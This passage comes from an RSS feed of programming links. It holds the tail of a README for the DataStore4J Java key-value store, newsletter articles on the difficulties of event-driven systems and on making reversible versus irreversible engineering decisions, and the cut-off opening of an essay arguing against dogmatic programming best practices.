<span>opt</span> = <span>new</span> <span>DbOptions</span>(); <span>DB</span> <span>db</span> = <span>new</span> <span>DataStore4J</span>(<span>dbPath</span>, <span>opt</span>); <span>byte</span>[] <span>key</span> = <span>"key"</span>.<span>getBytes</span>(); <span>byte</span>[] <span>value</span> = <span>"value"</span>.<span>getBytes</span>(); <span>// write</span> <span>db</span>.<span>put</span>(<span>key</span>, <span>value</span>); <span>// read</span> <span>byte</span>[] <span>result</span> = <span>db</span>.<span>get</span>(<span>key</span>); <span>// update</span> <span>db</span>.<span>put</span>(<span>key</span>, <span>"newValue"</span>.<span>getBytes</span>()); <span>// delete</span> <span>db</span>.<span>delete</span>(<span>key</span>); <span>// get search stats</span> <span>SearchStats</span> <span>searchStats</span> = <span>db</span>.<span>getSearchStats</span>(); <span>db</span>.<span>close</span>();</pre></div><h3>Docs:</h3><a href="https://github.com#docs"></a> <ul> <li><a href="https://github.com/theuntamed839/DataStore4J/blob/main/BenchMark/readme.md">Benchmarks</a></li> <li><a href="https://github.com/theuntamed839/DataStore4J/wiki/Database-Configuration-Options">Database Configuration Options</a></li> <li><a href="https://github.com/theuntamed839/DataStore4J/wiki">DB internals and Design</a></li> </ul><p></p><h3>Limitations:</h3><a href="https://github.com#limitations"></a> <ul> <li>Potential crash during compaction while adding files to the table, which may leave the database in an inconsistent state.</li> <li>Large keys (or occasional insertions of unusually large keys) can remain resident in memory if they happen to occupy critical pointer positions.</li> <li>Reader objects are managed without an LRU cache, which may lead to suboptimal memory utilization for large datasets.</li> </ul> <h3>Planned Improvements</h3><a href="https://github.com#planned-improvements"></a> <ol> <li> Replace the current Guava dependency with a custom internal Bloom filter implementation to minimize external dependencies.</li> <li> Introduce smarter caching and eviction strategies for reader objects (e.g., LRU or adaptive policies).</li> <li> Enhance crash recovery mechanisms to enable database restoration from any intermediate state.</li> <li> Improve robustness for large datasets, including graceful handling of exceptions such as excessive open files or memory exhaustion.</li> <li> Provide configurable selection of LZ4 implementations via the API.</li> <li> <a href="https://github.com/theuntamed839/DataStore4J/blob/00c8de4c7551e1ae39052cb0fd3f5be8a9bd4c71/DataStore4J/src/main/java/io/github/theuntamed839/datastore4j/search/Search.java#L69">Implement a more efficient file search algorithm</a></li> <li> Add support for custom key comparators.</li> <li> Enhance concurrency, ensuring reads are fully independent of writes.</li> </ol> </article></div></section>]]></description><pubDate>Mon, 15 Sep 2025 11:22:52 +0530</pubDate></item><item><link>https://newsletter.scalablethread.com/p/why-event-driven-systems-are-hard</link><title>Why Event-Driven Systems are Hard? (newsletter.scalablethread.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1ngwj0l/why_eventdriven_systems_are_hard/</guid><comments>https://www.reddit.com/r/programming/comments/1ngwj0l/why_eventdriven_systems_are_hard/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 21 min | <a href='https://www.reddit.com/r/programming/comments/1ngwj0l/why_eventdriven_systems_are_hard/'>Post permalink</a></p></section><section class='preview-image'><img src='https://substackcdn.com/image/fetch/$s_!yqHc!,w_1200,h_600,c_fill,f_jpg,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8f23e44c-2a3c-416c-82ed-55a143001014_1456x1048.png' /></section><section class='parsed-content'><div><p><span>An </span><em>event</em><span> is just a small message that says, "Hey, something happened!" For example, </span><code>UserClickedButton</code><span>, </span><code>PaymentProcessed</code><span>, or </span><code>NewOrderPlaced</code><span>. Services subscribe to the events they care about and react accordingly. This event-driven approach makes systems resilient and flexible. However, building and managing these systems at a large scale is surprisingly hard.</span></p><p>Imagine you and your friend have a secret code to pass notes. One day, you decide to add a new symbol to the code to mean something new. If you start using it without telling your friend, your new notes will confuse them. This is exactly what happens in event-driven systems.</p><p><span>For example, an </span><code>OrderPlaced</code><span> event might look like this:</span></p><p><span>Now imagine another service reads this event to send a confirmation email. Then, six months later, you add a new field: </span><code>shippingAddress</code><span>. You update the producer. The event becomes:</span></p><div><figure><a href="https://substackcdn.com/image/fetch/$s_!rBfd!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee987fa9-a617-4f5a-83dc-285b7cc3abbe_476x194.png"></a></figure></div><p><span>The problem is that other services, like the </span><code>OrderConfirmationEmailService</code><span>, might still be expecting the old version 1 format. When they receive this new message, they won't know what to do with the </span><code>shippingAddress </code><span>field. Worse, if a field they relied on was removed, they would simply crash.</span></p><p>This forces teams to carefully manage how schemas evolve. Common strategies include:</p><ul><li><p><strong>Backward Compatibility:</strong><span> New schemas can be read by services expecting the old schema. This usually means you can only add new, optional fields. You can't rename or remove existing ones.</span></p></li><li><p><strong>Forward Compatibility:</strong><span> Services expecting a new schema can still read messages written in an old one. This is harder to achieve and often requires setting default values for missing fields.</span></p></li><li><p><strong>Schema Registry:</strong><span> This is like a central dictionary for all your event "secret codes." Before a service sends a message, it checks with the registry to make sure the format is valid and compatible. It prevents services from sending out "confusing notes."</span></p></li></ul><p>Without strict rules for changing message formats, a simple update can cause a cascade of failures throughout a large system.</p><p>In a traditional, non-event-driven system, when a user clicks a button, one piece of code calls another, which calls another, in a straight line. If something breaks, you can look at the error log and see the entire sequence of calls, like following a single piece of string from start to finish.</p><p><span>In an event-driven system, that single string is cut into dozens of tiny pieces. The </span><code>OrderService</code><span> publishes an </span><code>OrderPlaced</code><span> event. The </span><code>PaymentService</code><span>, </span><code>ShippingService</code><span>, and </span><code>NotificationService</code><span> all pick it up and do their own work independently. They might, in turn, publish their own events.</span></p><p>Now, imagine a customer calls saying they placed an order but never got a confirmation email. Where did it go wrong?</p><ul><li><p><span>Did the </span><code>OrderService</code><span> fail to publish the event?</span></p></li><li><p><span>Did the </span><code>NotificationService</code><span> not receive it?</span></p></li><li><p>Did it receive the event but fail to connect to the email server?</p></li></ul><p>Debugging this can be difficult as you can't see the whole picture at once.</p><p><span>To solve this, we use </span><strong>distributed tracing</strong><span>. When the very first event is created, we attach a unique ID to it, called a </span><strong>Correlation ID</strong><span>. Every service that processes this event or creates a new event as a result must copy that same ID onto its own work.</span></p><p>When you need to investigate a problem, you can search for this one correlation ID across all the logs of all your services. This allows you to stitch the story back together and see the journey of that single request across the entire distributed system.</p><p>Events can disappear. Not because of bugs &mdash; because of infrastructure issues like network failure, a service crashing, or the message broker itself having a problem.</p><p><span>The core promise of many event systems is </span><a href="https://newsletter.scalablethread.com/i/146810780/at-least-once-guarantee">at-least-once delivery</a><span>. This means the system will do everything it can to make sure your event gets delivered. If a service that is supposed to receive an event is temporarily down, the message broker will hold onto the message and try again later.</span></p><div><figure><a href="https://substackcdn.com/image/fetch/$s_!sGmD!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc173afd2-6a2e-414d-a7ed-8af50160ab18_3183x2926.png"></a></figure></div><p><span>But what if a service has a persistent bug and crashes every time it tries to process a specific message? The broker will keep trying to redeliver it, and the service will keep crashing, until the broker retry limit is reached. To handle this, we use a </span><a href="https://newsletter.scalablethread.com/i/152780978/using-dead-letter-queues">Dead-Letter Queue (DLQ)</a><span>. After a few failed delivery attempts, the message broker moves the crash causing message to the DLQ. This stops the cycle of crashing and allows the service to continue processing other, valid messages. Engineers can then inspect the DLQ later to debug the problematic message.</span></p><p>The guarantee of "at-least-once delivery" creates a new, tricky problem: what if a message is delivered more than once? This can happen if a service processes an event but crashes before it can tell the message broker, "I'm done!" The broker, thinking the message was never handled, will deliver it again when the service restarts.</p><p><span>If the event was </span><code>IncreaseItemCountInCart</code><span>, receiving it twice is a big problem. The customer who wanted one item now has two in their cart. If it was </span><code>ChargeCreditCard</code><span>, they get charged twice.</span></p><div><figure><a href="https://substackcdn.com/image/fetch/$s_!BlHa!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7318f031-5ce1-43d4-870a-dcd0a94748ec_3038x1084.png"></a></figure></div><p><span>To prevent this, services must be </span><a href="https://newsletter.scalablethread.com/p/how-to-build-idempotent-apis">idempotent</a><span>. We can achieve idempotency by having the service keep a record of the event IDs it has already processed. When a new event comes in, the service first checks its records.</span></p><ol><li><p>Has it seen this event ID before?</p></li><li><p>If yes, it simply ignores the duplicate and tells the broker, "Yep, I'm done."</p></li><li><p>If no, it processes the event and then saves the event ID to its records before telling the broker it's done.</p></li></ol><p>This ensures that even if a message is delivered 100 times, the action is only performed once.</p><p><span>In a simple application with one database, when you write data, it's there instantly. If you change your shipping address, the very next screen you load will show the new address. This is called </span><a href="https://newsletter.scalablethread.com/i/146489166/strict-consistency-model">strong consistency</a><span>.</span></p><p><span>Event-driven systems give up this guarantee for the sake of scalability and resilience. They operate on a model of </span><a href="https://newsletter.scalablethread.com/i/146489166/eventual-consistency-model">eventual consistency</a><span>. For example, when a user updates their address, the </span><code>CustomerService</code><span> updates its own database and publishes an </span><code>AddressUpdated</code><span> event. The </span><code>ShippingService</code><span> and </span><code>BillingService</code><span> subscribe to this event. But it might take a few hundred milliseconds for them to receive the event and update their own data (This example is to provide some context, but ideally, the address should be stored at one place and the id of that record should be passed around in the events).</span></p><div><figure><a href="https://substackcdn.com/image/fetch/$s_!gE2i!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F67ec02ee-bcdf-4832-8ccc-0adfa1aec02b_2812x2100.png"></a></figure></div><p>Designing for eventual consistency means the system must be built to handle this temporary state of disagreement. This might involve:</p><ul><li><p>Designing user interfaces that account for the delay.</p></li><li><p>Adding logic to services to double-check critical data if needed.</p></li><li><p>Accepting that for some non-critical data, a small delay is acceptable.</p></li></ul><p><em>If you enjoyed this article, please hit the &#10084;&#65039; like button.</em></p><p><em>If you think someone else will benefit from this, please &#128257; share this post.</em></p></div><div class="gallery"><p><img src="https://substackcdn.com/image/fetch/$s_!H04Y!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fec4178cf-ceb4-41b5-984a-39babd83c5d5_447x174.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!rBfd!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee987fa9-a617-4f5a-83dc-285b7cc3abbe_476x194.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!sGmD!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc173afd2-6a2e-414d-a7ed-8af50160ab18_3183x2926.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!BlHa!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7318f031-5ce1-43d4-870a-dcd0a94748ec_3038x1084.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!gE2i!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F67ec02ee-bcdf-4832-8ccc-0adfa1aec02b_2812x2100.png"></p></div></section>]]></description><pubDate>Sun, 14 Sep 2025 22:28:39 +0530</pubDate></item><item><link>https://strategizeyourcareer.com/p/how-software-engineers-make-productive-decisions</link><title>How Software Engineers Make Productive Decisions (without slowing the team down) (strategizeyourcareer.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nglax1/how_software_engineers_make_productive_decisions/</guid><comments>https://www.reddit.com/r/programming/comments/1nglax1/how_software_engineers_make_productive_decisions/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 25 min | <a href='https://www.reddit.com/r/programming/comments/1nglax1/how_software_engineers_make_productive_decisions/'>Post permalink</a></p></section><section class='preview-image'><img src='https://substackcdn.com/image/fetch/$s_!mn9w!,w_1200,h_600,c_fill,f_jpg,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F74bbd26c-5055-4674-b33d-e18156d02bea_4813x3950.png' /></section><section class='parsed-content'><div><p>Most teams don&rsquo;t get stuck because problems are impossible. They get stuck because every choice is treated like it&rsquo;s irreversible. In reality, lots of calls are two-way doors: you can walk through, check the room, and walk back out. Save the caution for the true one-way doors: data migrations, security posture, customer-visible changes with real blast radius.</p><p>When I&rsquo;m unsure, I run a fast, risk-aware filter. If the downside is small, the change is reversible, or I can mitigate quickly, I ship with guardrails. That&rsquo;s how you move fast without being sloppy.</p><p><strong>&#11088; In this post, you'll learn:</strong></p><ul><li><p>How to tell if a decision is reversible or not</p></li><li><p>The 3 questions I ask before slowing down</p></li><li><p>How to move fast without being sloppy</p></li><li><p>Why speed compounds into career growth</p></li></ul><p>Not every door leads to a cliff, some just swing back open. Two-way doors are things like toggling a feature flag, shipping a non-consumed response field, or swapping an internal library behind an abstraction. If it goes sideways, you flip the switch or roll back.</p><p>One-way doors are different. Think data migrations, schema changes, or decisions that can silently corrupt data or take a core service down. At my job, when a migration touches your database and could risk data loss, I&rsquo;d slow down on purpose: rehearsal in non-prod environments, snapshot plans, read-only windows if needed, and crisp rollback playbooks.</p><p>The productivity benefit is knowing the difference before you start. Over-investing in reversible decisions burns time and morale. Under-investing in high-stakes calls burns trust and customer goodwill.</p><p>When a decision lands on your lap, take 1-2 minutes and ask:</p><p>Is the effect invisible, annoying, or catastrophic? User-visible errors, security regressions, and data integrity issues are &ldquo;slow-down&rdquo; territory. On the other hand, shipping a field the client doesn&rsquo;t yet consume is low risk. I&rsquo;ve green-lit rollouts like this with smoke tests + feature flag, skipping a day or two of heavy testing because there was effectively no customer impact and rollback was trivial.</p><p>Reversal options change everything. If I can roll back in ~10 minutes because I have alarms, canary checks, and a pre-wired rollback, I bias toward speed. When reversal is painful (e.g., a destructive migration), I do design notes, peer review, and a rehearsal.</p><p>Sometimes you can&rsquo;t prevent every issue, but you can limit the blast radius. Canaries, partial rollouts, and scoped feature flags mean we learn quickly without harming many users. A line I actually use with stakeholders:</p><p>&ldquo;Do we need to focus on prevention here, or can we move forward and mitigate fast with a small blast radius if something is wrong? If mitigation is fast and contained, let&rsquo;s go.&rdquo;</p><div><figure><a href="https://substackcdn.com/image/fetch/$s_!4ove!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe27276b0-b814-4dd0-8330-adb762162b0b_865x401.png"></a></figure></div><p>If your situation is somewhere in the middle, pick the stricter option to err on the safe side.</p><p>Flags are the safest way to keep a single-branch mainline in production. Merge early, merge often, even incomplete work, because the flag hides it. That enables smaller PRs, faster reviews, and quicker rollback. In my experience, for many features, the client hasn&rsquo;t started working on the changes on their end, which makes these deployments extremely low risk because they aren&rsquo;t consuming your new changes yet.</p><p><strong>Checklist for feature flags:</strong></p><ul><li><p>Default-off flag per risk domain (UI, backend path, integration).</p></li><li><p>One-line rationale in the PR (&ldquo;why now, why safe&rdquo;).</p></li><li><p>Smoke tests for both on/off states.</p></li><li><p>Exit plan: when and how to delete the flag.</p></li></ul><p>Even without a feature flag, speed is safe if your observability and rollback are tight:</p><ol><li><p><strong>Before:</strong><span> canary tests succeeding, metrics emitted.</span></p></li><li><p><strong>After:</strong><span> alarms on errors, latency, saturation, and key business metrics.</span></p></li><li><p><strong>Abort:</strong><span> scripted rollback (or deploy previous artifact) within ~10 minutes.</span></p></li></ol><p>I&rsquo;ve shipped features knowing that if anything trips alarms, the change is reverted quickly. That confidence changes the cost/benefit calculus.</p><ul><li><p>Timebox reversible decisions to 30-60 minutes of research. Make a call, document trade-offs, and move.</p></li><li><p>Slow down for one-way doors: destructive DB changes, non-backward compatible API changes, payment logic. Do some shadow testing to properly mimic production.</p></li></ul><p><strong>Two-minute safety-net before shipping:</strong></p><ul><li><p>Write a one-line rationale.</p></li><li><p>Identify the kill switch (flag or rollback).</p></li><li><p>Ping the right stakeholder if risk &gt; medium.</p></li><li><p>Confirm alarms cover the critical path.</p></li></ul><p>I added a new field to an HTTP response that clients weren&rsquo;t consuming yet. A full regression would have cost 1-2 days. Instead, I agreed with my team to:</p><ul><li><p>Shipped behind a feature flag.</p></li><li><p>Ran smoke tests on the endpoint.</p></li><li><p>Set alarms and a canary to verify no unexpected 4xx/5xx patterns.</p></li><li><p>Communicated &ldquo;proceed unless blocked.&rdquo;</p></li></ul><p>No customer impact, tiny blast radius, trivial rollback. That&rsquo;s a textbook two-way door.</p><p>For a risky database migration (possible customer data loss if wrong, service down for 1+ hours), we did the opposite:</p><ul><li><p>Wrote a design doc with trade-offs and risk analysis.</p></li><li><p>Investigated the migration in staging with production-like data.</p></li><li><p>Booked a change window, took snapshots, confirmed restore steps.</p></li><li><p>Assigned an on-call with a printed execution and rollback playbook.</p></li></ul><p>One-way doors require us to slow down, for good reason.</p><div><figure><a href="https://substackcdn.com/image/fetch/$s_!MQj5!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F582106f5-720b-4aa0-8ca8-4941b6bfe3cd_1241x433.png"></a></figure></div><p>You don&rsquo;t grow by being right once. You grow by making many decisions and handling the wrong ones well. Use the 3-question filter:</p><ol><li><p>Impact if wrong</p></li><li><p>Ease of reversal</p></li><li><p>Fast mitigation with small blast radius</p></li></ol><p>Turn as many calls as possible into two-way doors with flags, canaries, alarms, and quick rollbacks. Slow down only for the truly irreversible. That&rsquo;s how software engineers make decisions&mdash;fast, but not sloppy.</p><p>Book a 15-minute huddle where you: state the problem, options, trade-offs, risk level, and your recommendation. Close with: &ldquo;I&rsquo;ll proceed unless you see blockers.&rdquo; Silence becomes alignment, and you avoid approval ping-pong.</p><p>You don&rsquo;t need a five-page RFC for every call. A micro-ADR keeps history without ceremony:</p><pre><code><code># ADR: Add field (server response) - Context: Mobile clients currently ignore this field, used by future device rollout. - Decision: Ship behind flag, smoke test, canary 5%, alarms on 4xx/5xx and latency. - Alternatives: Delay until client change, ship without flag. - Consequences: If wrong, toggle flag off, rollback build, cleanup flag in 2 weeks. - Author: <your-name> | Date: 2025-09-13 </your-name></code></code></pre><p>This takes two minutes and prevents &ldquo;why did we do this?&rdquo; archaeology months later.</p><p><strong>How do I know if a decision is reversible?</strong><span> If you can turn it off, roll it back quickly, or hide it (flag) without customer harm, it&rsquo;s reversible. If it threatens data integrity, security, or customer trust and can&rsquo;t be undone cleanly, treat it as a one-way door.</span></p><p><strong>When should I write a full RFC vs. a micro-ADR?</strong><span> Use a micro-ADR for low/medium-risk calls to keep momentum. Use an RFC or longer design doc for high-risk, hard-to-reverse changes (migrations, auth, billing).</span></p><p><strong>What&rsquo;s a good rollback target?</strong><span> Aim for ~10 minutes from alarm to safe state for medium-risk changes. For high-risk changes, rehearse rollback in staging and ensure snapshot/restore times are known.</span></p><p><strong>How do I communicate speed safely?</strong><span> Frame decisions in risk terms: &ldquo;Impact small, reversible in 10 minutes, mitigation plan ready.&rdquo; If mitigation is fast and the blast radius is tiny, bias toward speed.</span></p><p><strong>Do feature flags add tech debt?</strong><span> Only if you don&rsquo;t clean them up. Track flags, add an &ldquo;expiry&rdquo; note in your micro-ADR, and remove them once the decision is proven.</span></p><div><figure><a href="https://substackcdn.com/image/fetch/$s_!M2Z1!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbe0e0bed-a699-429b-94ee-b29c768c5323_800x60.png"></a></figure></div><div><figure><a href="https://substackcdn.com/image/fetch/$s_!iggC!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffb37fb50-b8f5-4348-9675-1129f39e6926_800x60.png"></a></figure></div><p>These are some great articles I&rsquo;ve read last week:</p><ul><li><p><a href="https://read.highgrowthengineer.com/p/operating-principles-to-staff-part-1?r=2tt34d">Operating Principles That Guided Me to Staff Engineer (Part 1: Driving Impact)</a><span> by </span></p><span>. I was happy to read this post about Jordan&rsquo;s promotion. Don&rsquo;t wait for tickets, hunt for problems and solve them early. That&rsquo;s how you create visible impact and grow faster.</span></li><li><p><a href="https://newsletter.eng-leadership.com/p/how-to-use-ai-to-improve-teamwork?r=2tt34d">How to Use AI to Improve Teamwork in Engineering Teams</a><span> by </span></p><span> and </span><span> . AI won&rsquo;t fix teamwork on its own, but with trust and autonomy in place it removes friction and lets teams move faster.</span></li><li><p><a href="https://growthalgorithm.dev/p/if-you-write-80-less-code-as-tech?r=2tt34d">If You Write 80% Less Code as Tech Lead</a><span> by </span></p><span>. As a tech lead, your leverage comes from enabling others: teach through reviews, own key components, and carve time for prototypes.</span></li><li><p><a href="https://thehustlingengineer.substack.com/p/genai-for-engineers-part-1-the-foundations?r=2tt34d">GenAI for Engineers (Part 1: The Foundations)</a><span> by </span></p><span> . I wrote recently about context engineering. LLMs are just prediction machines. To build production-ready systems, we need to focus on the context.</span></li></ul><div><figure><a href="https://substackcdn.com/image/fetch/$s_!Wk_Z!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2cd056dd-a3ed-4cd0-8a5c-88321c90bbc6_800x60.png"></a></figure></div><p><em>P.S. This may interest you:</em></p><ol><li><p><em><span>Are you in doubt whether the paid version of the newsletter is for you? </span><strong><a href="https://strategizeyourcareer.com/about">Discover the benefits here</a></strong></em></p></li><li><p><span>Could you take one minute to answer a quick, anonymous survey to make me improve this newsletter? </span><strong><a href="https://forms.gle/2A5QCTAevJJuHaro9">Take the survey here</a></strong></p></li><li><p><em><span>Are you a brand looking to advertise to engaged engineers and leaders? </span><strong><a href="https://www.passionfroot.me/fransoto">Book your slot now</a></strong></em></p></li></ol><p><span>Give a like &#10084;&#65039; to this post if you found it useful, and share it with a friend to </span><a href="http://strategizeyourcareer.com/leaderboard">get referral rewards</a></p></div><div class="gallery"><p><img src="https://substackcdn.com/image/fetch/$s_!mn9w!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F74bbd26c-5055-4674-b33d-e18156d02bea_4813x3950.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!4ove!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe27276b0-b814-4dd0-8330-adb762162b0b_865x401.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!MQj5!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F582106f5-720b-4aa0-8ca8-4941b6bfe3cd_1241x433.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!M2Z1!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbe0e0bed-a699-429b-94ee-b29c768c5323_800x60.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!iggC!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffb37fb50-b8f5-4348-9675-1129f39e6926_800x60.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!Wk_Z!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2cd056dd-a3ed-4cd0-8a5c-88321c90bbc6_800x60.png"></p></div></section>]]></description><pubDate>Sun, 14 Sep 2025 13:24:39 +0530</pubDate></item><item><link>https://theaxolot.wordpress.com/2025/09/10/be-an-agnostic-programmer/</link><title>Be An Agnostic Programmer (theaxolot.wordpress.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1ng1yn4/be_an_agnostic_programmer/</guid><comments>https://www.reddit.com/r/programming/comments/1ng1yn4/be_an_agnostic_programmer/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 7 min | <a href='https://www.reddit.com/r/programming/comments/1ng1yn4/be_an_agnostic_programmer/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Hey guys! Back with another article on a topic that&#39;s been stewing in the back of my mind for a while. Please enjoy!</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://theaxolot.wordpress.com/wp-content/uploads/2024/05/cropped-1677184869904.jpg?w=200' /></section><section class='parsed-content'><div><p>If civil engineering is a mature field, then software development is a baby. An ugly baby, but perhaps a late bloomer. The so-called &ldquo;best practices&rdquo; of our industry are a chaotic nebula of differing, often incompatible, perspectives.</p><p><em>&ldquo;If you don&rsquo;t follow TDD, you&rsquo;re not a professional.&rdquo;</em></p><p><em>&ldquo;If you think OOP leads to overengineering, you&rsquo;re doing it wrong.&rdquo;</em></p><p>&ldquo;<em>100% code coverage</em> <em>is the gold standard.&rdquo;</em></p><p>But I&rsquo;m not here to discuss individual practices in detail. Instead, I want to zoom out and look at how we got here in the first place. Strap in, because this is gonna get philosophical.</p><p><strong>Margaret Hamilton </strong>coined the term &ldquo;software engineering&rdquo; to lend the discipline a legitimacy when the moon landing was in the works. It seems to have worked. Although nowadays, the term is so broad that a simple React web app also qualifies.</p><p>When you include the word &ldquo;engineering&rdquo; in your title, people think your discipline is this scientific, rigorous, methodological process that yields the best answer based on collective historical experience. And to the layman, it might seem so. After all, software runs on machines, and machines fall under &ldquo;engineering.&rdquo;</p><p>But let&rsquo;s not kid ourselves.</p><p>Software development isn&rsquo;t a science.</p><p>It&rsquo;s not an art, either. It&rsquo;s a mix of both, and that&rsquo;s why I love it.</p><p>The science is in the logic of your program and the architecture of your system. It&rsquo;s in how well you can prove the correctness of your code (invariants, assertions, tests, etc). And it&rsquo;s in how you investigate and deduce your way to the root causes of issues.</p><p>But there&rsquo;s a human element, too.</p><p>With every sizable new system or feature, you explore while your design isn&rsquo;t yet crystallized, and that gives room to creativity. You don&rsquo;t always know how your interfaces (APIs, classes, namespaces, modules, etc) will end up until you have a good amount implementation in front of you (part of my dislike of by-the-book TDD).</p><p>And just like a UI/UX designer, you need empathy and foresight to ensure a good experience for future maintainers, even if you have to break conventions sometimes. If that&rsquo;s not art, then what is?</p><blockquote><p>Know the rules well, so you can break them effectively</p></blockquote><p>But you can&rsquo;t break the rules without a diverse set of tools in your toolbox. Whenever I see someone proselytize a specific programming paradigm as a one-size fits all &ldquo;best practice&rdquo;, it&rsquo;s because they don&rsquo;t get this.</p><p>Programming attracts people who are enamored with logic in action. Unfortunately, it also attracts people who can be obsessive about it, to the point where they fallaciously believe that programming is a discipline with hard rules like other kinds of engineering. And when that happens, you end up exclusively subscribing to a paradigm your were taught as &ldquo;the correct way,&rdquo; and it becomes difficult to think outside of that box.</p><p>The classic example is Object-Oriented Programming. Many developers had their first exposure to programming through this paradigm, and were taught little else. So when they went into the workforce, they constantly ran into problems that didn&rsquo;t map neatly onto OOP principles. So what did they do? They forced them to, like a square peg when all you have are round holes.</p><p>I was lucky in that I was exposed to many programming styles during my early education, such that I don&rsquo;t feel constrained to adhering to a single one. Does that make me unprincipled? No, it makes me versatile. Git gud.</p><p>Some endure a hard journey of unlearning these rigid beliefs. But others double down and become dogmatists, unable to concede to the drawbacks of their favorite paradigm lest they invalidate their whole identity as developers. And some, though far fewer, become grifters who profit off the air of authority that being &ldquo;principled&rdquo; gives them.</p><p>Programming books are a major culprit, because they hold the ultimate air of authority. Honest authors will:</p><ul> <li>Acknowledge when something is more their opinion than fact</li> <li>Highlight the drawbacks of their suggested methodologies as well as their benefits</li> <li>Give leeway for breaking of their rules in service of the ultimate goal of code: to be maintained by humans (until AI takes over, I mean)</li> </ul><p>But dishonest authors will:</p><ul> <li>Intersperse personal opinions with facts to subtly convert readers</li> <li>Treat their preferred paradigm like a product to be sold (e.g downplaying the flaws)</li> <li>Assert objective superiority of their methodologies in all scenarios</li> <li>Cherry-pick or misrepresent studies that confirm what they&rsquo;re pushing and ignore those that contradict</li> </ul><p>(Note: Isn&rsquo;t it interesting how we rarely cite studies when debating the best programming guidelines? But rather we always appeal to principles and/or psychology?).</p><p>But the biggest culprit of all, in my opinion, is a lack of confidence.</p><p>Every discipline has beginners that ask questions like, &ldquo;What&rsquo;s the best way to do X?&rdquo; or &ldquo;Is it okay if I don&rsquo;t do X?&rdquo;. In fields involving creativity, the most common answer is, &ldquo;it depends.&rdquo;</p><p>People still give general recommendations, but the experts are confident enough in their skills to pick and choose which guidelines to follow, yet humble enough to acknowledge they can&rsquo;t push hard rules.</p><p>Expert software developers, in particular, discuss trade-offs instead of asserting best practices with snappy soundbites. Because every situation is unique. That&rsquo;s what makes the job so difficult, yet so rewarding.</p><p>But single-minded adherents are terrified of tapping into their creative side, unless they&rsquo;re heavily constrained. They&rsquo;re terrified of improvising and not knowing exactly what to do in every situation. But most of all, they&rsquo;re terrified that there isn&rsquo;t an objective way to get a correct answer to their problems.</p><p>&ldquo;Everything has to adhere to a principle, or else how do I know I&rsquo;m doing the right thing?&rdquo;</p><p>Experience, intuition, and being comfortable with 